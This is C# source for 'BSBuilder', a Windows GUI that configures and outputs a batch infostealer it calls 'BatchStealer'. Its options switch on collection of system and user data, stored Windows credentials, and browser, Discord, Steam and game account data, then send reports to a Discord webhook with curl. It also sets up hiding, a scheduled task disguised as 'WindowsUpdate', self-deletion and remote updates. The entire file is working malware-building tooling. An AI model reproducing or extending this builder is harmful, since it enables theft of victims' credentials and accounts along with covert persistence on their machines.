﻿using System;
using System.Windows.Forms;
using System.Net;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;


namespace BSBuilder
{
    public partial class Form1 : Form
    {
        string batchfetchURL = Properties.Settings.Default.fetchurl;
        string batchlocation = Properties.Settings.Default.batchlocation;
        string batch = string.Empty;

        bool forcerestart = false;
        bool acceptTOS = Properties.Settings.Default.acceptTOS;
        bool startadmin = Properties.Settings.Default.startadmin;
        bool systeminfo = Properties.Settings.Default.systeminfo;
        bool tasklist = Properties.Settings.Default.tasklist;
        bool netuser = Properties.Settings.Default.netuser;
        bool quser = Properties.Settings.Default.quser;
        bool cmdkey = Properties.Settings.Default.cmdkey;
        bool ipconfig = Properties.Settings.Default.ipconfig;
        bool chrome = Properties.Settings.Default.chrome;
        bool opera = Properties.Settings.Default.opera;
        bool vivaldi = Properties.Settings.Default.vivaldi;
        bool firefox = Properties.Settings.Default.firefox;
        bool osu = Properties.Settings.Default.osu;
        bool discord = Properties.Settings.Default.discord;
        bool steam = Properties.Settings.Default.steam;
        bool minecraft = Properties.Settings.Default.minecraft;
        bool growtopia = Properties.Settings.Default.growtopia;
        bool recurring = Properties.Settings.Default.recurring;
        bool selfdelete = Properties.Settings.Default.selfdelete;
        bool optimize = Properties.Settings.Default.optimize;
        bool obfuscate = Properties.Settings.Default.obfuscate;

        string webhook = Properties.Settings.Default.webhook;
        string reportstartmsg = Properties.Settings.Default.reportstartmsg;
        string reportendmsg = Properties.Settings.Default.reportendmsg;
        string hidepath = Properties.Settings.Default.hidepath;
        string whenscheduled = Properties.Settings.Default.whenscheduled;
        string schedulename = Properties.Settings.Default.schedulename;
        string batchcopyname = Properties.Settings.Default.batchcopyname;
        string batchupdatername = Properties.Settings.Default.batchupdatername;
        string vbname = Properties.Settings.Default.vbname;
        string updateurl = Properties.Settings.Default.updateurl;
        string targetusername = Properties.Settings.Default.targetusername;

        string curlmessage0 = "curl --silent --output /dev/null -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
        string curlmessage1 = "\\\"}\"";

        public Form1()
        {
            InitializeComponent();

            acceptTOScheckbox.Checked = Properties.Settings.Default.acceptTOS;
            startadmincheckbox.Checked = Properties.Settings.Default.startadmin;
            systeminfocheckbox.Checked = Properties.Settings.Default.systeminfo;
            tasklistcheckbox.Checked = Properties.Settings.Default.tasklist;
            netusercheckbox.Checked = Properties.Settings.Default.netuser;
            qusercheckbox.Checked = Properties.Settings.Default.quser;
            cmdkeycheckbox.Checked = Properties.Settings.Default.cmdkey;
            ipconfigcheckbox.Checked = Properties.Settings.Default.ipconfig;
            chromecheckbox.Checked = Properties.Settings.Default.chrome;
            operacheckbox.Checked = Properties.Settings.Default.opera;
            vivaldicheckbox.Checked = Properties.Settings.Default.vivaldi;
            firefoxcheckbox.Checked = Properties.Settings.Default.firefox;
            osucheckbox.Checked = Properties.Settings.Default.osu;
            discordcheckbox.Checked = Properties.Settings.Default.discord;
            steamcheckbox.Checked = Properties.Settings.Default.steam;
            minecraftcheckbox.Checked = Properties.Settings.Default.minecraft;
            growtopiacheckbox.Checked = Properties.Settings.Default.growtopia;
            recurringcheckbox.Checked = Properties.Settings.Default.recurring;
            selfdeletecheckbox.Checked = Properties.Settings.Default.selfdelete;
            optimizecheckbox.Checked = Properties.Settings.Default.optimize;
            obfuscatecheckbox.Checked = Properties.Settings.Default.obfuscate;

            webhooktextbox.Text = Properties.Settings.Default.webhook;
            reportstartmsgtextbox.Text = Properties.Settings.Default.reportstartmsg;
            reportendmsgtextbox.Text = Properties.Settings.Default.reportendmsg;
            hidepathtextbox.Text = Properties.Settings.Default.hidepath;
            whenscheduledtextbox.Text = Properties.Settings.Default.whenscheduled;
            schedulenametextbox.Text = Properties.Settings.Default.schedulename;
            batchcopynametextbox.Text = Properties.Settings.Default.batchcopyname;
            batchupdaternametextbox.Text = Properties.Settings.Default.batchupdatername;
            vbnametextbox.Text = Properties.Settings.Default.vbname;
            updateurltextbox.Text = Properties.Settings.Default.updateurl;
            targetusernametextbox.Text = Properties.Settings.Default.targetusername;

            fetchurl.Text = Properties.Settings.Default.fetchurl;
            batchlocationtextbox.Text = Properties.Settings.Default.batchlocation;

            fetchbatch();
        }

        void fetchbatch()
        {
            var client = new WebClient();
            client.DownloadStringCompleted += (sender, e) =>
            {
                try
                {
                    batch = e.Result;
                    richtextbox.Text = batch;
                    inspector.Text = inspector.Text + " (Batch file fetched from the URL)";
                }
                catch
                {
                    if (batchlocation.Length != 0)
                    {
                        batch = File.ReadAllText(Path.GetFullPath(batchlocation));
                        richtextbox.Text = batch;
                        inspector.Text = inspector.Text + " (Batch file loaded from local drive)";
                    }
                    else
                    {
                        MessageBox.Show("Failed to load batch from " + batchfetchURL + " and no local file has been set.", "Critical error");
                    }
                }
            };

            Uri BatchURL = new Uri(batchfetchURL);
            try { client.DownloadStringAsync(BatchURL); }
            catch { MessageBox.Show("Failed to load batch from " + batchfetchURL, "Critical error"); }
        }

        private void searchbatchbutton_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog();
            file.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
            file.Title = "Select the bat you want to build (Needs to be BatchStealer)";
            file.Filter = "Batch script (*.bat*)|*.bat*";
            file.RestoreDirectory = true;
            if (file.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    batch = File.ReadAllText(Path.GetFullPath(file.FileName));
                    richtextbox.Text = batch;

                    batchlocation = Path.GetFullPath(file.FileName);
                    batchlocationtextbox.Text = batchlocation;
                }
                catch
                {
                    MessageBox.Show("Failed to load the batch file.", "Fail");
                }
            }
        }

        void removeGOTO(string data)
        {
            batch = batch.Replace(data, string.Empty);

            data = data.Substring(5);
            data = ":" + data.PadLeft(data.Length, '0');

            batch = batch.Replace(data, string.Empty);
        }

        void editVAR(string original, string variable, string data)
        {
            batch = batch.Replace(original, "set \"" + variable + "=" + data + "\"");
        }

        void editCURL(string original, string data)
        {
            string newcurl = curlmessage0 + data + curlmessage1;
            batch = batch.Replace(original, newcurl);
        }

        private void buildbutton_Click(object sender, EventArgs e)
        {
            if (forcerestart)
            {
                Application.Restart();
                Environment.Exit(0);
            }
            else
            {
                if (batch.Length != 0)
                {
                    if (acceptTOS)
                        removeGOTO("goto remove_this_if_you_agree_to_follow_the_TOS");
                    if (startadmin)
                        removeGOTO("goto skipadministrator");
                    if (systeminfo)
                        removeGOTO("goto skipsysteminfocapture");
                    if (tasklist)
                        removeGOTO("goto skiptasklist");
                    if (netuser)
                        removeGOTO("goto skipnetuser");
                    if (quser)
                        removeGOTO("goto skipquser");
                    if (cmdkey)
                        removeGOTO("goto skipcmdkey");
                    if (ipconfig)
                        removeGOTO("goto skipipconfig");
                    if (chrome)
                        removeGOTO("goto skipchrome");
                    if (opera)
                        removeGOTO("goto skipopera");
                    if (vivaldi)
                        removeGOTO("goto skipvivaldi");
                    if (firefox)
                        removeGOTO("goto skipfirefox");
                    if (osu)
                        removeGOTO("goto skiposu");
                    if (discord)
                        removeGOTO("goto skipdiscord");
                    if (steam)
                        removeGOTO("goto skipsteam");
                    if (minecraft)
                        removeGOTO("goto skipminecraft");
                    if (growtopia)
                        removeGOTO("goto skipgrowtopia");
                    if (recurring)
                        removeGOTO("goto skiprecurring");
                    if (selfdelete)
                        removeGOTO("goto skipselfdelete");
                    if (webhook.Length != 0)
                        editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
                    if (hidepath.Length != 0)
                        editVAR("set \"vpath=C:\\ProgramData\"", "vpath", hidepath);
                    if (whenscheduled.Length != 0)
                        editVAR("set \"when=Daily\"", "when", whenscheduled);
                    if (schedulename.Length != 0)
                        editVAR("set \"ScheduleName=WindowsUpdate\"", "ScheduleName", schedulename);
                    if (batchcopyname.Length != 0)
                        editVAR("set \"bname=0.bat\"", "bname", batchcopyname);
                    if (batchupdatername.Length != 0)
                        editVAR("set \"uname=1.bat\"", "uname", batchupdatername);
                    if (vbname.Length != 0)
                        editVAR("set \"vname=0.vbs\"", "vname", vbname);
                    if (updateurl.Length != 0)
                        editVAR("set \"updateurl=\"", "updateurl", updateurl);
                    if (targetusername.Length != 0)
                        editVAR("set \"targetusername=\"", "targetusername", targetusername);

                    if (reportstartmsg.Length != 0)
                        editCURL(curlmessage0 + "```[Report from %USERNAME% - %NetworkIP%]\\nLocal time: %HH24%:%MI%```" + curlmessage1, reportstartmsg);
                    if (reportendmsg.Length != 0)
                        editCURL(curlmessage0 + "```Batch Scheduled: %recurring%\\n[End of report]```" + curlmessage1, reportendmsg);

                    if (optimize)
                    {
                        batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
                        batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
                    }

                    if (obfuscate)
                    {
                        //todo
                    }

                    using (StreamWriter wt = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "output.bat"))
                    {
                        wt.WriteLine(batch);
                    }

                    Process.Start(AppDomain.CurrentDomain.BaseDirectory);

                    richtextbox.Text = batch;

                    Builderbox.Enabled = false;
                    URLBox.Enabled = false;
                    BatchlocationBox.Enabled = false;
                    acceptTOScheckbox.Enabled = false;
                    forcerestart = true;
                    buildbutton.Text = "Restart the program";

                    Application.Restart();
                    Environment.Exit(0);
                }
                else
                {
                    MessageBox.Show("Could not build, missing batch script.", "Critical Error");
                }
            }
        }

        private void webhooktextbox_TextChanged(object sender, EventArgs e)
        {
            webhook = webhooktextbox.Text;
        }

        private void reportstartmsgtextbox_TextChanged(object sender, EventArgs e)
        {
            reportstartmsg = reportstartmsgtextbox.Text;
        }

        private void reportendmsgtextbox_TextChanged(object sender, EventArgs e)
        {
            reportendmsg = reportendmsgtextbox.Text;
        }

        private void hidepathtextbox_TextChanged(object sender, EventArgs e)
        {
            hidepath = hidepathtextbox.Text;
        }

        private void schedulenametextbox_TextChanged(object sender, EventArgs e)
        {
            schedulename = schedulenametextbox.Text;
        }

        private void batchcopynametextbox_TextChanged(object sender, EventArgs e)
        {
            batchcopyname = batchcopynametextbox.Text;
        }

        private void batchupdaternametextbox_TextChanged(object sender, EventArgs e)
        {
            batchupdatername = batchupdaternametextbox.Text;
        }

        private void vbnametextbox_TextChanged(object sender, EventArgs e)
        {
            vbname = vbnametextbox.Text;
        }

        private void updateurltextbox_TextChanged(object sender, EventArgs e)
        {
            updateurl = updateurltextbox.Text;
        }

        private void targetusernametextbox_TextChanged(object sender, EventArgs e)
        {
            targetusername = targetusernametextbox.Text;
        }

        private void fetchurl_TextChanged(object sender, EventArgs e)
        {
            batchfetchURL = fetchurl.Text;
        }

        private void whenscheduledtextbox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (whenscheduledtextbox.Text == "Onlogon")
            {
                if (startadmin)
                    whenscheduled = whenscheduledtextbox.Text;
                else
                {
                    MessageBox.Show("Please enable 'Start as Administrator' before changing this to '" + whenscheduledtextbox.Text + "'. Otherwise the batch file won't be scheduled.\n\nYour batch file will not ask for administrator when started by the scheduler. It will stay hidden.", "Incorrect settings");
                    whenscheduledtextbox.Text = "Daily";
                }

            }
            else
                whenscheduled = whenscheduledtextbox.Text;
        }

        private void acceptTOScheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (acceptTOScheckbox.Checked)
            {
                acceptTOS = true;
                allpanel.Enabled = true;
            }
            else
            {
                acceptTOS = false;
                allpanel.Enabled = false;
            }
        }

        private void startadmincheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (startadmincheckbox.Checked)
            {
                startadmin = true;
            }
            else
            {
                startadmin = false;
            }
        }

        private void selfdeletecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (selfdeletecheckbox.Checked)
            {
                selfdelete = true;
            }
            else
            {
                selfdelete = false;
            }
        }

        private void systeminfocheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (systeminfocheckbox.Checked)
            {
                systeminfo = true;
            }
            else
            {
                systeminfo = false;
            }
        }

        private void tasklistcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (tasklistcheckbox.Checked)
            {
                tasklist = true;
            }
            else
            {
                tasklist = false;
            }
        }

        private void netusercheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (netusercheckbox.Checked)
            {
                netuser = true;
            }
            else
            {
                netuser = false;
            }
        }

        private void qusercheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (qusercheckbox.Checked)
            {
                quser = true;
            }
            else
            {
                quser = false;
            }
        }

        private void cmdkeycheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (cmdkeycheckbox.Checked)
            {
                cmdkey = true;
            }
            else
            {
                cmdkey = false;
            }
        }

        private void chromecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (chromecheckbox.Checked)
            {
                chrome = true;
            }
            else
            {
                chrome = false;
            }
        }

        private void operacheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (operacheckbox.Checked)
            {
                opera = true;
            }
            else
            {
                opera = false;
            }
        }

        private void vivaldicheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (vivaldicheckbox.Checked)
            {
                vivaldi = true;
            }
            else
            {
                vivaldi = false;
            }
        }

        private void firefoxcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (firefoxcheckbox.Checked)
            {
                firefox = true;
            }
            else
            {
                firefox = false;
            }
        }

        private void osucheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (osucheckbox.Checked)
            {
                osu = true;
            }
            else
            {
                osu = false;
            }
        }

        private void discordcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (discordcheckbox.Checked)
            {
                discord = true;
            }
            else
            {
                discord = false;
            }
        }

        private void steamcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (steamcheckbox.Checked)
            {
                steam = true;
            }
            else
            {
                steam = false;
            }
        }

        private void minecraftcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (minecraftcheckbox.Checked)
            {
                minecraft = true;
            }
            else
            {
                minecraft = false;
            }
        }

        private void growtopiacheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (growtopiacheckbox.Checked)
            {
                growtopia = true;
            }
            else
            {
                growtopia = false;
            }
        }

        private void recurringcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (recurringcheckbox.Checked)
            {
                recurring = true;
                recurringpanel.Enabled = true;
            }
            else
            {
                recurring = false;
                recurringpanel.Enabled = false;
            }
        }

        private void optimizecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (optimizecheckbox.Checked)
            {
                optimize = true;
            }
            else
            {
                optimize = false;
            }
        }

        private void obfuscatecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (obfuscatecheckbox.Checked)
            {
                obfuscate = true;
            }
            else
            {
                obfuscate = false;
            }
        }

        private void ipconfigcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (ipconfigcheckbox.Checked)
            {
                ipconfig = true;
            }
            else
            {
                ipconfig = false;
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.fetchurl = batchfetchURL;

            Properties.Settings.Default.acceptTOS = acceptTOS;
            Properties.Settings.Default.startadmin = startadmin;
            Properties.Settings.Default.systeminfo = systeminfo;
            Properties.Settings.Default.tasklist = tasklist;
            Properties.Settings.Default.netuser = netuser;
            Properties.Settings.Default.quser = quser;
            Properties.Settings.Default.cmdkey = cmdkey;
            Properties.Settings.Default.ipconfig = ipconfig;
            Properties.Settings.Default.chrome = chrome;
            Properties.Settings.Default.opera = opera;
            Properties.Settings.Default.vivaldi = vivaldi;
            Properties.Settings.Default.firefox = firefox;
            Properties.Settings.Default.osu = osu;
            Properties.Settings.Default.discord = discord;
            Properties.Settings.Default.steam = steam;
            Properties.Settings.Default.minecraft = minecraft;
            Properties.Settings.Default.growtopia = growtopia;
            Properties.Settings.Default.recurring = recurring;
            Properties.Settings.Default.selfdelete = selfdelete;
            Properties.Settings.Default.optimize = optimize;
            Properties.Settings.Default.obfuscate = obfuscate;

            Properties.Settings.Default.webhook = webhook;
            Properties.Settings.Default.reportstartmsg = reportstartmsg;
            Properties.Settings.Default.reportendmsg = reportendmsg;
            Properties.Settings.Default.hidepath = hidepath;
            Properties.Settings.Default.whenscheduled = whenscheduled;
            Properties.Settings.Default.schedulename = schedulename;
            Properties.Settings.Default.batchcopyname = batchcopyname;
            Properties.Settings.Default.batchupdatername = batchupdatername;
            Properties.Settings.Default.vbname = vbname;
            Properties.Settings.Default.updateurl = updateurl;
            Properties.Settings.Default.targetusername = targetusername;
            Properties.Settings.Default.batchlocation = batchlocation;

            Properties.Settings.Default.Save();
        }
    }
}
